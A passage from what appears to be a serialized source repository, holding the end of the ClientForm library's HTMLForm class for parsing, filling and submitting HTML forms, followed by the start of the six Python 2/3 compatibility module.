(subclass of ValueError) is raised if a list item can't\n    be found.  ItemCountError (subclass of ValueError) is raised if an attempt\n    is made to select more than one item and the control doesn't allow that, or\n    set/get_single are called and the control contains more than one item.\n    AttributeError is raised if a control or item is readonly or disabled and\n    an attempt is made to alter its value.\n\n    Security note: Remember that any passwords you store in HTMLForm instances\n    will be saved to disk in the clear if you pickle them (directly or\n    indirectly).  The simplest solution to this is to avoid pickling HTMLForm\n    objects.  You could also pickle before filling in any password, or just set\n    the password to \"\" before pickling.\n\n\n    Public attributes:\n\n    action: full (absolute URI) form action\n    method: \"GET\" or \"POST\"\n    enctype: form transfer encoding MIME type\n    name: name of form (None if no name was specified)\n    attrs: dictionary mapping original HTML form attributes to their values\n\n    controls: list of Control instances; do not alter this list\n     (instead, call form.new_control to make a Control and add it to the\n     form, or control.add_to_form if you already have a Control instance)\n\n\n\n    Methods for form filling:\n    -------------------------\n\n    Most of the these methods have very similar arguments.  See\n    HTMLForm.find_control.__doc__ for details of the name, type, kind, label\n    and nr arguments.\n\n    def find_control(self,\n                     name=None, type=None, kind=None, id=None, predicate=None,\n                     nr=None, label=None)\n\n    get_value(name=None, type=None, kind=None, id=None, nr=None,\n              by_label=False,  # by_label is deprecated\n              label=None)\n    set_value(value,\n              name=None, type=None, kind=None, id=None, nr=None,\n              by_label=False,  # by_label is deprecated\n              label=None)\n\n    clear_all()\n    clear(name=None, type=None, kind=None, id=None, nr=None, label=None)\n\n    set_all_readonly(readonly)\n\n\n    Method applying only to FileControls:\n\n    add_file(file_object,\n             content_type=\"application/octet-stream\", filename=None,\n             name=None, id=None, nr=None, label=None)\n\n\n    Methods applying only to clickable controls:\n\n    click(name=None, type=None, id=None, nr=0, coord=(1,1), label=None)\n    click_request_data(name=None, type=None, id=None, nr=0, coord=(1,1),\n                       label=None)\n    click_pairs(name=None, type=None, id=None, nr=0, coord=(1,1), label=None)\n\n    \"\"\"\n\n    type2class = {\n        \"text\": TextControl,\n        \"password\": PasswordControl,\n        \"hidden\": HiddenControl,\n        \"textarea\": TextareaControl,\n\n        \"isindex\": IsindexControl,\n\n        \"file\": FileControl,\n\n        \"button\": IgnoreControl,\n        \"buttonbutton\": IgnoreControl,\n        \"reset\": IgnoreControl,\n        \"resetbutton\": IgnoreControl,\n\n        \"submit\": SubmitControl,\n        \"submitbutton\": SubmitButtonControl,\n        \"image\": ImageControl,\n\n        \"radio\": RadioControl,\n        \"checkbox\": CheckboxControl,\n        \"select\": SelectControl,\n        }\n\n#---------------------------------------------------\n# Initialisation.  Use ParseResponse / ParseFile instead.\n\n    def __init__(self, action, method=\"GET\",\n                 enctype=None,\n                 name=None, attrs=None,\n                 request_class=_urllib.request.Request,\n                 forms=None, labels=None, id_to_labels=None,\n                 backwards_compat=True):\n        \"\"\"\n        In the usual case, use ParseResponse (or ParseFile) to create new\n        HTMLForm objects.\n\n        action: full (absolute URI) form action\n        method: \"GET\" or \"POST\"\n        enctype: form transfer encoding MIME type\n        name: name of form\n        attrs: dictionary mapping original HTML form attributes to their values\n\n        \"\"\"\n        self.action = action\n        self.method = method\n        self.enctype = enctype or \"application/x-www-form-urlencoded\"\n        self.name = name\n        if attrs is not None:\n            self.attrs = attrs.copy()\n        else:\n            self.attrs = {}\n        self.controls = []\n        self._request_class = request_class\n\n        # these attributes are used by zope.testbrowser\n        self._forms = forms  # this is a semi-public API!\n        self._labels = labels  # this is a semi-public API!\n        self._id_to_labels = id_to_labels  # this is a semi-public API!\n\n        self.backwards_compat = backwards_compat  # note __setattr__\n\n        self._urlunparse = _urllib.parse.urlunparse\n        self._urlparse = _urllib.parse.urlparse\n\n    def __getattr__(self, name):\n        if name == \"backwards_compat\":\n            return self._backwards_compat\n        return getattr(HTMLForm, name)\n\n    def __setattr__(self, name, value):\n        # yuck\n        if name == \"backwards_compat\":\n            name = \"_backwards_compat\"\n            value = bool(value)\n            for cc in self.controls:\n                try:\n                    items = cc.items \n                except AttributeError:\n                    continue\n                else:\n                    for ii in items:\n                        for ll in ii.get_labels():\n                            ll._backwards_compat = value\n        self.__dict__[name] = value\n\n    def new_control(self, type, name, attrs,\n                    ignore_unknown=False, select_default=False, index=None):\n        \"\"\"Adds a new control to the form.\n\n        This is usually called by ParseFile and ParseResponse.  Don't call it\n        youself unless you're building your own Control instances.\n\n        Note that controls representing lists of items are built up from\n        controls holding only a single list item.  See ListControl.__doc__ for\n        further information.\n\n        type: type of control (see Control.__doc__ for a list)\n        attrs: HTML attributes of control\n        ignore_unknown: if true, use a dummy Control instance for controls of\n         unknown type; otherwise, use a TextControl\n        select_default: for RADIO and multiple-selection SELECT controls, pick\n         the first item as the default if no 'selected' HTML attribute is\n         present (this defaulting happens when the HTMLForm.fixup method is\n         called)\n        index: index of corresponding element in HTML (see\n         MoreFormTests.test_interspersed_controls for motivation)\n\n        \"\"\"\n        type = type.lower()\n        klass = self.type2class.get(type)\n        if klass is None:\n            if ignore_unknown:\n                klass = IgnoreControl\n            else:\n                klass = TextControl\n\n        a = attrs.copy()\n        if issubclass(klass, ListControl):\n            control = klass(type, name, a, select_default, index)\n        else:\n            control = klass(type, name, a, index)\n\n        if type == \"select\" and len(attrs) == 1:\n            for ii in xrange(len(self.controls)-1, -1, -1):\n                ctl = self.controls[ii]\n                if ctl.type == \"select\":\n                    ctl.close_control()\n                    break\n\n        control.add_to_form(self)\n        control._urlparse = self._urlparse\n        control._urlunparse = self._urlunparse\n\n    def fixup(self):\n        \"\"\"Normalise form after all controls have been added.\n\n        This is usually called by ParseFile and ParseResponse.  Don't call it\n        youself unless you're building your own Control instances.\n\n        This method should only be called once, after all controls have been\n        added to the form.\n\n        \"\"\"\n        for control in self.controls:\n            control.fixup()\n        self.backwards_compat = self._backwards_compat\n\n#---------------------------------------------------\n    def __str__(self):\n        header = \"%s%s %s %s\" % (\n            (self.name and self.name+\" \" or \"\"),\n            self.method, self.action, self.enctype)\n        rep = [header]\n        for control in self.controls:\n            rep.append(\"  %s\" % str(control))\n        return \"<%s>\" % \"\\n\".join(rep)\n\n#---------------------------------------------------\n# Form-filling methods.\n\n    def __getitem__(self, name):\n        return self.find_control(name).value\n    def __contains__(self, name):\n        return bool(self.find_control(name))\n    def __setitem__(self, name, value):\n        control = self.find_control(name)\n        try:\n            control.value = value\n        except AttributeError as e:\n            raise ValueError(str(e))\n\n    def get_value(self,\n                  name=None, type=None, kind=None, id=None, nr=None,\n                  by_label=False,  # by_label is deprecated\n                  label=None):\n        \"\"\"Return value of control.\n\n        If only name and value arguments are supplied, equivalent to\n\n        form[name]\n\n        \"\"\"\n        if by_label:\n            deprecation(\"form.get_value_by_label(...)\")\n        c = self.find_control(name, type, kind, id, label=label, nr=nr)\n        if by_label:\n            try:\n                meth = c.get_value_by_label\n            except AttributeError:\n                raise NotImplementedError(\n                    \"control '%s' does not yet support by_label\" % c.name)\n            else:\n                return meth()\n        else:\n            return c.value\n    def set_value(self, value,\n                  name=None, type=None, kind=None, id=None, nr=None,\n                  by_label=False,  # by_label is deprecated\n                  label=None):\n        \"\"\"Set value of control.\n\n        If only name and value arguments are supplied, equivalent to\n\n        form[name] = value\n\n        \"\"\"\n        if by_label:\n            deprecation(\"form.get_value_by_label(...)\")\n        c = self.find_control(name, type, kind, id, label=label, nr=nr)\n        if by_label:\n            try:\n                meth = c.set_value_by_label\n            except AttributeError:\n                raise NotImplementedError(\n                    \"control '%s' does not yet support by_label\" % c.name)\n            else:\n                meth(value)\n        else:\n            c.value = value\n    def get_value_by_label(\n        self, name=None, type=None, kind=None, id=None, label=None, nr=None):\n        \"\"\"\n\n        All arguments should be passed by name.\n\n        \"\"\"\n        c = self.find_control(name, type, kind, id, label=label, nr=nr)\n        return c.get_value_by_label()\n\n    def set_value_by_label(\n        self, value,\n        name=None, type=None, kind=None, id=None, label=None, nr=None):\n        \"\"\"\n\n        All arguments should be passed by name.\n\n        \"\"\"\n        c = self.find_control(name, type, kind, id, label=label, nr=nr)\n        c.set_value_by_label(value)\n\n    def set_all_readonly(self, readonly):\n        for control in self.controls:\n            control.readonly = bool(readonly)\n\n    def clear_all(self):\n        \"\"\"Clear the value attributes of all controls in the form.\n\n        See HTMLForm.clear.__doc__.\n\n        \"\"\"\n        for control in self.controls:\n            control.clear()\n\n    def clear(self,\n              name=None, type=None, kind=None, id=None, nr=None, label=None):\n        \"\"\"Clear the value attribute of a control.\n\n        As a result, the affected control will not be successful until a value\n        is subsequently set.  AttributeError is raised on readonly controls.\n\n        \"\"\"\n        c = self.find_control(name, type, kind, id, label=label, nr=nr)\n        c.clear()\n\n\n#---------------------------------------------------\n# Form-filling methods applying only to ListControls.\n\n    def possible_items(self,  # deprecated\n                       name=None, type=None, kind=None, id=None,\n                       nr=None, by_label=False, label=None):\n        \"\"\"Return a list of all values that the specified control can take.\"\"\"\n        c = self._find_list_control(name, type, kind, id, label, nr)\n        return c.possible_items(by_label)\n\n    def set(self, selected, item_name,  # deprecated\n            name=None, type=None, kind=None, id=None, nr=None,\n            by_label=False, label=None):\n        \"\"\"Select / deselect named list item.\n\n        selected: boolean selected state\n\n        \"\"\"\n        self._find_list_control(name, type, kind, id, label, nr).set(\n            selected, item_name, by_label)\n    def toggle(self, item_name,  # deprecated\n               name=None, type=None, kind=None, id=None, nr=None,\n               by_label=False, label=None):\n        \"\"\"Toggle selected state of named list item.\"\"\"\n        self._find_list_control(name, type, kind, id, label, nr).toggle(\n            item_name, by_label)\n\n    def set_single(self, selected,  # deprecated\n                   name=None, type=None, kind=None, id=None,\n                   nr=None, by_label=None, label=None):\n        \"\"\"Select / deselect list item in a control having only one item.\n\n        If the control has multiple list items, ItemCountError is raised.\n\n        This is just a convenience method, so you don't need to know the item's\n        name -- the item name in these single-item controls is usually\n        something meaningless like \"1\" or \"on\".\n\n        For example, if a checkbox has a single item named \"on\", the following\n        two calls are equivalent:\n\n        control.toggle(\"on\")\n        control.toggle_single()\n\n        \"\"\"  # by_label ignored and deprecated\n        self._find_list_control(\n            name, type, kind, id, label, nr).set_single(selected)\n    def toggle_single(self, name=None, type=None, kind=None, id=None,\n                      nr=None, by_label=None, label=None):  # deprecated\n        \"\"\"Toggle selected state of list item in control having only one item.\n\n        The rest is as for HTMLForm.set_single.__doc__.\n\n        \"\"\"  # by_label ignored and deprecated\n        self._find_list_control(name, type, kind, id, label, nr).toggle_single()\n\n#---------------------------------------------------\n# Form-filling method applying only to FileControls.\n\n    def add_file(self, file_object, content_type=None, filename=None,\n                 name=None, id=None, nr=None, label=None):\n        \"\"\"Add a file to be uploaded.\n\n        file_object: file-like object (with read method) from which to read\n         data to upload\n        content_type: MIME content type of data to upload\n        filename: filename to pass to server\n\n        If filename is None, no filename is sent to the server.\n\n        If content_type is None, the content type is guessed based on the\n        filename and the data from read from the file object.\n\n        XXX\n        At the moment, guessed content type is always application/octet-stream.\n        Use sndhdr, imghdr modules.  Should also try to guess HTML, XML, and\n        plain text.\n\n        Note the following useful HTML attributes of file upload controls (see\n        HTML 4.01 spec, section 17):\n\n        accept: comma-separated list of content types that the server will\n         handle correctly; you can use this to filter out non-conforming files\n        size: XXX IIRC, this is indicative of whether form wants multiple or\n         single files\n        maxlength: XXX hint of max content length in bytes?\n\n        \"\"\"\n        self.find_control(name, \"file\", id=id, label=label, nr=nr).add_file(\n            file_object, content_type, filename)\n\n#---------------------------------------------------\n# Form submission methods, applying only to clickable controls.\n\n    def click(self, name=None, type=None, id=None, nr=0, coord=(1,1),\n              request_class=_urllib.request.Request,\n              label=None):\n        \"\"\"Return request that would result from clicking on a control.\n\n        The request object is a _urllib.request.Request instance, which you can pass to\n        urllib2.urlopen (or ClientCookie.urlopen).\n\n        Only some control types (INPUT/SUBMIT & BUTTON/SUBMIT buttons and\n        IMAGEs) can be clicked.\n\n        Will click on the first clickable control, subject to the name, type\n        and nr arguments (as for find_control).  If no name, type, id or number\n        is specified and there are no clickable controls, a request will be\n        returned for the form in its current, un-clicked, state.\n\n        IndexError is raised if any of name, type, id or nr is specified but no\n        matching control is found.  ValueError is raised if the HTMLForm has an\n        enctype attribute that is not recognised.\n\n        You can optionally specify a coordinate to click at, which only makes a\n        difference if you clicked on an image.\n\n        \"\"\"\n        return self._click(name, type, id, label, nr, coord, \"request\",\n                           self._request_class)\n\n    def click_request_data(self,\n                           name=None, type=None, id=None,\n                           nr=0, coord=(1,1),\n                           request_class=_urllib.request.Request,\n                           label=None):\n        \"\"\"As for click method, but return a tuple (url, data, headers).\n\n        You can use this data to send a request to the server.  This is useful\n        if you're using httplib or urllib rather than urllib2.  Otherwise, use\n        the click method.\n\n        # Untested.  Have to subclass to add headers, I think -- so use urllib2\n        # instead!\n        import urllib\n        url, data, hdrs = form.click_request_data()\n        r = _urllib.request.urlopen(url, data)\n\n        # Untested.  I don't know of any reason to use httplib -- you can get\n        # just as much control with urllib2.\n        import httplib, urlparse\n        url, data, hdrs = form.click_request_data()\n        tup = urlparse(url)\n        host, path = tup[1], _urllib.parse.urlunparse((None, None)+tup[2:])\n        conn = httplib.HTTPConnection(host)\n        if data:\n            httplib.request(\"POST\", path, data, hdrs)\n        else:\n            httplib.request(\"GET\", path, headers=hdrs)\n        r = conn.getresponse()\n\n        \"\"\"\n        return self._click(name, type, id, label, nr, coord, \"request_data\",\n                           self._request_class)\n\n    def click_pairs(self, name=None, type=None, id=None,\n                    nr=0, coord=(1,1),\n                    label=None):\n        \"\"\"As for click_request_data, but returns a list of (key, value) pairs.\n\n        You can use this list as an argument to ClientForm.urlencode.  This is\n        usually only useful if you're using httplib or urllib rather than\n        urllib2 or ClientCookie.  It may also be useful if you want to manually\n        tweak the keys and/or values, but this should not be necessary.\n        Otherwise, use the click method.\n\n        Note that this method is only useful for forms of MIME type\n        x-www-form-urlencoded.  In particular, it does not return the\n        information required for file upload.  If you need file upload and are\n        not using urllib2, use click_request_data.\n\n        Also note that Python 2.0's urllib.urlencode is slightly broken: it\n        only accepts a mapping, not a sequence of pairs, as an argument.  This\n        messes up any ordering in the argument.  Use ClientForm.urlencode\n        instead.\n\n        \"\"\"\n        return self._click(name, type, id, label, nr, coord, \"pairs\",\n                           self._request_class)\n\n#---------------------------------------------------\n\n    def find_control(self,\n                     name=None, type=None, kind=None, id=None,\n                     predicate=None, nr=None,\n                     label=None):\n        \"\"\"Locate and return some specific control within the form.\n\n        At least one of the name, type, kind, predicate and nr arguments must\n        be supplied.  If no matching control is found, ControlNotFoundError is\n        raised.\n\n        If name is specified, then the control must have the indicated name.\n\n        If type is specified then the control must have the specified type (in\n        addition to the types possible for <input> HTML tags: \"text\",\n        \"password\", \"hidden\", \"submit\", \"image\", \"button\", \"radio\", \"checkbox\",\n        \"file\" we also have \"reset\", \"buttonbutton\", \"submitbutton\",\n        \"resetbutton\", \"textarea\", \"select\" and \"isindex\").\n\n        If kind is specified, then the control must fall into the specified\n        group, each of which satisfies a particular interface.  The types are\n        \"text\", \"list\", \"multilist\", \"singlelist\", \"clickable\" and \"file\".\n\n        If id is specified, then the control must have the indicated id.\n\n        If predicate is specified, then the control must match that function.\n        The predicate function is passed the control as its single argument,\n        and should return a boolean value indicating whether the control\n        matched.\n\n        nr, if supplied, is the sequence number of the control (where 0 is the\n        first).  Note that control 0 is the first control matching all the\n        other arguments (if supplied); it is not necessarily the first control\n        in the form.  If no nr is supplied, AmbiguityError is raised if\n        multiple controls match the other arguments (unless the\n        .backwards-compat attribute is true).\n\n        If label is specified, then the control must have this label.  Note\n        that radio controls and checkboxes never have labels: their items do.\n\n        \"\"\"\n        if ((name is None) and (type is None) and (kind is None) and\n            (id is None) and (label is None) and (predicate is None) and\n            (nr is None)):\n            raise ValueError(\n                \"at least one argument must be supplied to specify control\")\n        return self._find_control(name, type, kind, id, label, predicate, nr)\n\n#---------------------------------------------------\n# Private methods.\n\n    def _find_list_control(self,\n                           name=None, type=None, kind=None, id=None, \n                           label=None, nr=None):\n        if ((name is None) and (type is None) and (kind is None) and\n            (id is None) and (label is None) and (nr is None)):\n            raise ValueError(\n                \"at least one argument must be supplied to specify control\")\n\n        return self._find_control(name, type, kind, id, label, \n                                  is_listcontrol, nr)\n\n    def _find_control(self, name, type, kind, id, label, predicate, nr):\n        if ((name is not None) and (name is not Missing) and\n            not isstringlike(name)):\n            raise TypeError(\"control name must be string-like\")\n        if (type is not None) and not isstringlike(type):\n            raise TypeError(\"control type must be string-like\")\n        if (kind is not None) and not isstringlike(kind):\n            raise TypeError(\"control kind must be string-like\")\n        if (id is not None) and not isstringlike(id):\n            raise TypeError(\"control id must be string-like\")\n        if (label is not None) and not isstringlike(label):\n            raise TypeError(\"control label must be string-like\")\n        if (predicate is not None) and not callable(predicate):\n            raise TypeError(\"control predicate must be callable\")\n        if (nr is not None) and nr < 0:\n            raise ValueError(\"control number must be a positive integer\")\n\n        orig_nr = nr\n        found = None\n        ambiguous = False\n        if nr is None and self.backwards_compat:\n            nr = 0\n\n        for control in self.controls:\n            if ((name is not None and name != control.name) and\n                (name is not Missing or control.name is not None)):\n                continue\n            if type is not None and type != control.type:\n                continue\n            if kind is not None and not control.is_of_kind(kind):\n                continue\n            if id is not None and id != control.id:\n                continue\n            if predicate and not predicate(control):\n                continue\n            if label:\n                for l in control.get_labels():\n                    if l.text.find(label) > -1:\n                        break\n                else:\n                    continue\n            if nr is not None:\n                if nr == 0:\n                    return control  # early exit: unambiguous due to nr\n                nr -= 1\n                continue\n            if found:\n                ambiguous = True\n                break\n            found = control\n\n        if found and not ambiguous:\n            return found\n\n        description = []\n        if name is not None: description.append(\"name %s\" % repr(name))\n        if type is not None: description.append(\"type '%s'\" % type)\n        if kind is not None: description.append(\"kind '%s'\" % kind)\n        if id is not None: description.append(\"id '%s'\" % id)\n        if label is not None: description.append(\"label '%s'\" % label)\n        if predicate is not None:\n            description.append(\"predicate %s\" % predicate)\n        if orig_nr: description.append(\"nr %d\" % orig_nr)\n        description = \", \".join(description)\n\n        if ambiguous:\n            raise AmbiguityError(\"more than one control matching \"+description)\n        elif not found:\n            raise ControlNotFoundError(\"no control matching \"+description)\n        assert False\n\n    def _click(self, name, type, id, label, nr, coord, return_type,\n               request_class=_urllib.request.Request):\n        try:\n            control = self._find_control(\n                name, type, \"clickable\", id, label, None, nr)\n        except ControlNotFoundError:\n            if ((name is not None) or (type is not None) or (id is not None) or\n                (nr != 0)):\n                raise\n            # no clickable controls, but no control was explicitly requested,\n            # so return state without clicking any control\n            return self._switch_click(return_type, request_class)\n        else:\n            return control._click(self, coord, return_type, request_class)\n\n    def _pairs(self):\n        \"\"\"Return sequence of (key, value) pairs suitable for urlencoding.\"\"\"\n        return [(k, v) for (i, k, v, c_i) in self._pairs_and_controls()]\n\n\n    def _pairs_and_controls(self):\n        \"\"\"Return sequence of (index, key, value, control_index)\n        of totally ordered pairs suitable for urlencoding.\n\n        control_index is the index of the control in self.controls\n        \"\"\"\n        pairs = []\n        for control_index in xrange(len(self.controls)):\n            control = self.controls[control_index]\n            for ii, key, val in control._totally_ordered_pairs():\n                pairs.append((ii, key, val, control_index))\n\n        # stable sort by ONLY first item in tuple\n        pairs.sort()\n\n        return pairs\n\n    def _request_data(self):\n        \"\"\"Return a tuple (url, data, headers).\"\"\"\n        method = self.method.upper()\n        #scheme, netloc, path, parameters, query, frag = _urllib.parse.urlparse(self.action)\n        parts = self._urlparse(self.action)\n        rest, (query, frag) = parts[:-2], parts[-2:]\n\n        if method == \"GET\":\n            self.enctype = \"application/x-www-form-urlencoded\"  # force it\n            parts = rest + (urlencode(self._pairs()), None)\n            uri = self._urlunparse(parts)\n            return uri, None, []\n        elif method == \"POST\":\n            parts = rest + (query, None)\n            uri = self._urlunparse(parts)\n            if self.enctype == \"application/x-www-form-urlencoded\":\n                return (uri, urlencode(self._pairs()),\n                        [(\"Content-Type\", self.enctype)])\n            elif self.enctype == \"text/plain\":\n                return (uri, self._pairs(),\n                        [(\"Content-Type\", self.enctype)])\n            elif self.enctype == \"multipart/form-data\":\n                data = _cStringIO()\n                http_hdrs = []\n                mw = MimeWriter(data, http_hdrs)\n                f = mw.startmultipartbody(\"form-data\", add_to_http_hdrs=True,\n                                          prefix=0)\n                for ii, k, v, control_index in self._pairs_and_controls():\n                    self.controls[control_index]._write_mime_data(mw, k, v)\n                mw.lastpart()\n                return uri, data.getvalue(), http_hdrs\n            else:\n                raise ValueError(\n                    \"unknown POST form encoding type '%s'\" % self.enctype)\n        else:\n            raise ValueError(\"Unknown method '%s'\" % method)\n\n    def _switch_click(self, return_type, request_class=_urllib.request.Request):\n        # This is called by HTMLForm and clickable Controls to hide switching\n        # on return_type.\n        if return_type == \"pairs\":\n            return self._pairs()\n        elif return_type == \"request_data\":\n            return self._request_data()\n        else:\n            req_data = self._request_data()\n\n            req = request_class(req_data[0], req_data[1])\n            for key, val in req_data[2]:\n                add_hdr = req.add_header\n                if key.lower() == \"content-type\":\n                    try:\n                        add_hdr = req.add_unredirected_header\n                    except AttributeError:\n                        # pre-2.4 and not using ClientCookie\n                        pass\n                add_hdr(key, val)\n            return req\n", "thirdparty/clientform/__init__.py": "", "thirdparty/six/__init__.py": "# Copyright (c) 2010-2020 Benjamin Peterson\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n\n\"\"\"Utilities for writing code that runs on Python 2 and 3\"\"\"\n\nfrom __future__ import absolute_import\n\nimport functools\nimport itertools\nimport operator\nimport sys\nimport types\n\n__author__ = \"Benjamin Peterson <benjamin@python.org>\"\n__version__ = \"1.16.0\"\n\n\n# Useful for very coarse version differentiation.\nPY2 = sys.version_info[0] == 2\nPY3 = sys.version_info[0] == 3\nPY34 = sys.version_info[0:2] >= (3, 4)\n\nif PY3:\n    string_types = str,\n    integer_types = int,\n    class_types = type,\n    text_type = str\n    binary_type = bytes\n\n    MAXSIZE = sys.maxsize\nelse:\n    string_types = basestring,\n    integer_types = (int, long)\n    class_types = (type, types.ClassType)\n    text_type = unicode\n    binary_type = str\n\n    if sys.platform.startswith(\"java\"):\n        # Jython always uses 32 bits.\n        MAXSIZE = int((1 << 31) - 1)\n    else:\n        # It's possible to have sizeof(long) != sizeof(Py_ssize_t).\n        class X(object):\n\n            def __len__(self):\n                return 1 << 31\n        try:\n            len(X())\n        except OverflowError:\n            # 32-bit\n            MAXSIZE = int((1 << 31) - 1)\n        else:\n            # 64-bit\n            MAXSIZE = int((1 << 63) - 1)\n        del X\n\nif PY34:\n    from importlib.util import spec_from_loader\nelse:\n    spec_from_loader = None\n\n\ndef _add_doc(func, doc):\n    \"\"\"Add documentation to a function.\"\"\"\n    func.__doc__ = doc\n\n\ndef _import_module(name):\n    \"\"\"Import module, returning the module after the last dot.\"\"\"\n    __import__(name)\n    return sys.modules[name]\n\n\nclass _LazyDescr(object):\n\n    def __init__(self, name):\n        self.name = name\n\n    def __get__(self, obj, tp):\n        result = self._resolve()\n        setattr(obj, self.name, result)  # Invokes __set__.\n        try:\n            # This is a bit ugly, but it avoids running this again by\n            # removing this descriptor.\n            delattr(obj.__class__, self.name)\n        except AttributeError:\n            pass\n        return result\n\n\nclass MovedModule(_LazyDescr):\n\n    def __init__(self, name, old, new=None):\n        super(MovedModule, self).__init__(name)\n        if PY3:\n            if new is None:\n                new = name\n            self.mod = new\n        else:\n            self.mod = old\n\n    def _resolve(self):\n        return _import_module(self.mod)\n\n    def __getattr__(self, attr):\n        _module = self._resolve()\n        value = getattr(_module, attr)\n        setattr(self, attr, value)\n        return value\n\n\nclass _LazyModule(types.ModuleType):\n\n    def __init__(self, name):\n        super(_LazyModule, self).__init__(name)\n        self.__doc__ = self.__class__.__doc__\n\n    def __dir__(self):\n        attrs = [\"__doc__\", \"__name__\"]\n        attrs += [attr.name for attr in self._moved_attributes]\n        return attrs\n\n    # Subclasses should override this\n    _moved_attributes = []\n\n\nclass MovedAttribute(_LazyDescr):\n\n    def __init__(self, name, old_mod, new_mod, old_attr=None, new_attr=None):\n        super(MovedAttribute, self).__init__(name)\n        if PY3:\n            if new_mod is None:\n                new_mod = name\n            self.mod = new_mod\n            if new_attr is None:\n                if old_attr is None:\n                    new_attr = name\n                else:\n                    new_attr = old_attr\n            self.attr = new_attr\n        else:\n            self.mod = old_mod\n            if old_attr is None:\n                old_attr = name\n            self.attr = old_attr\n\n    def _resolve(self):\n        module = _import_module(self.mod)\n        return getattr(module, self.attr)\n\n\nclass _SixMetaPathImporter(object):\n\n    \"\"\"\n    A meta path importer to import six.moves and its submodules.\n\n    This class implements a PEP302 finder and loader. It should be compatible\n    with Python 2.5 and all existing versions of Python3\n    \"\"\"\n\n    def __init__(self, six_module_name):\n        self.name = six_module_name\n        self.known_modules = {}\n\n    def _add_module(self, mod, *fullnames):\n        for fullname in fullnames:\n            self.known_modules[self.name + \".\" + fullname] = mod\n\n    def _get_module(self, fullname):\n        return self.known_modules[self.name + \".\" + fullname]\n\n    def find_module(self, fullname, path=None):\n        if fullname in self.known_modules:\n            return self\n        return None\n\n    def find_spec(self, fullname, path, target=None):\n        if fullname in self.known_modules:\n            return spec_from_loader(fullname, self)\n        return None\n\n    def __get_module(self, fullname):\n        try:\n            return self.known_modules[fullname]\n        except KeyError:\n            raise ImportError(\"This loader does not know module \" + fullname)\n\n    def load_module(self, fullname):\n        try:\n            # in case of a reload\n            return sys.modules[fullname]\n        except KeyError:\n            pass\n        mod = self.__get_module(fullname)\n        if isinstance(mod, MovedModule):\n            mod = mod._resolve()\n        else:\n            mod.__loader__ = self\n        sys.modules[fullname] = mod\n        return mod\n\n    def is_package(self, fullname):\n        \"\"\"\n        Return true, if the named module is a package.\n\n        We need this method to get correct spec objects with\n        Python 3.4 (see PEP451)\n        \"\"\"\n        return hasattr(self.__get_module(fullname), \"__path__\")\n\n    def get_code(self, fullname):\n        \"\"\"Return None\n\n        Required, if is_package is implemented\"\"\"\n        self.__get_module(fullname)  # eventually raises ImportError\n        return None\n    get_source = get_code  # same as get_code\n\n    def create_module(self, spec):\n        return self.load_module(spec.name)\n\n    def exec_module(self, module):\n        pass\n\n_importer = _SixMetaPathImporter(__name__)\n\n\nclass _MovedItems(_LazyModule):\n\n    \"\"\"Lazy loading of moved objects\"\"\"\n    __path__ = []  # mark as package\n\n\n_moved_attributes = [\n    MovedAttribute(\"cStringIO\", \"cStringIO\", \"io\", \"StringIO\"),\n    MovedAttribute(\"filter\", \"itertools\", \"builtins\", \"ifilter\", \"filter\"),\n    MovedAttribute(\"filterfalse\", \"itertools\", \"itertools\", \"ifilterfalse\", \"filterfalse\"),\n    MovedAttribute(\"input\", \"__builtin__\", \"builtins\", \"raw_input\", \"input\"),\n    MovedAttribute(\"intern\", \"__builtin__\", \"sys\"),\n    MovedAttribute(\"map\", \"itertools\", \"builtins\", \"imap\", \"map\"),\n    MovedAttribute(\"getcwd\", \"os\", \"os\", \"getcwdu\", \"getcwd\"),\n    MovedAttribute(\"getcwdb\", \"os\", \"os\", \"getcwd\", \"getcwdb\"),\n    MovedAttribute(\"getoutput\", \"commands\", \"subprocess\"),\n    MovedAttribute(\"range\", \"__builtin__\", \"builtins\", \"xrange\", \"range\"),\n    MovedAttribute(\"reload_module\", \"__builtin__\", \"importlib\" if PY34 else \"imp\", \"reload\"),\n    MovedAttribute(\"reduce\", \"__builtin__\", \"functools\"),\n    MovedAttribute(\"shlex_quote\", \"pipes\", \"shlex\", \"quote\"),\n    MovedAttribute(\"StringIO\", \"StringIO\", \"io\"),\n    MovedAttribute(\"UserDict\", \"UserDict\", \"collections\", \"IterableUserDict\", \"UserDict\"),\n    MovedAttribute(\"UserList\", \"UserList\", \"collections\"),\n    MovedAttribute(\"UserString\", \"UserString\", \"collections\"),\n    MovedAttribute(\"xrange\", \"__builtin__\", \"builtins\", \"xrange\", \"range\"),\n    MovedAttribute(\"zip\", \"itertools\", \"builtins\", \"izip\", \"zip\"),\n    MovedAttribute(\"zip_longest\", \"itertools\", \"itertools\", \"izip_longest\", \"zip_longest\"),\n    MovedModule(\"builtins\", \"__builtin__\"),\n    MovedModule(\"configparser\", \"ConfigParser\"),\n    MovedModule(\"collections_abc\", \"collections\", \"collections.abc\" if sys.version_info >= (3, 3) else \"collections\"),\n    MovedModule(\"copyreg\", \"copy_reg\"),\n    MovedModule(\"dbm_gnu\", \"gdbm\", \"dbm.gnu\"),\n    MovedModule(\"dbm_ndbm\", \"dbm\", \"dbm.ndbm\"),\n    MovedModule(\"_dummy_thread\", \"dummy_thread\", \"_dummy_thread\" if sys.version_info < (3, 9) else \"_thread\"),\n    MovedModule(\"http_cookiejar\", \"cookielib\", \"http.cookiejar\"),\n    MovedModule(\"http_cookies\", \"Cookie\", \"http.cookies\"),\n    MovedModule(\"html_entities\", \"htmlentitydefs\", \"html.entities\"),\n    MovedModule(\"html_parser\", \"HTMLParser\", \"html.parser\"),\n    MovedModule(\"http_client\", 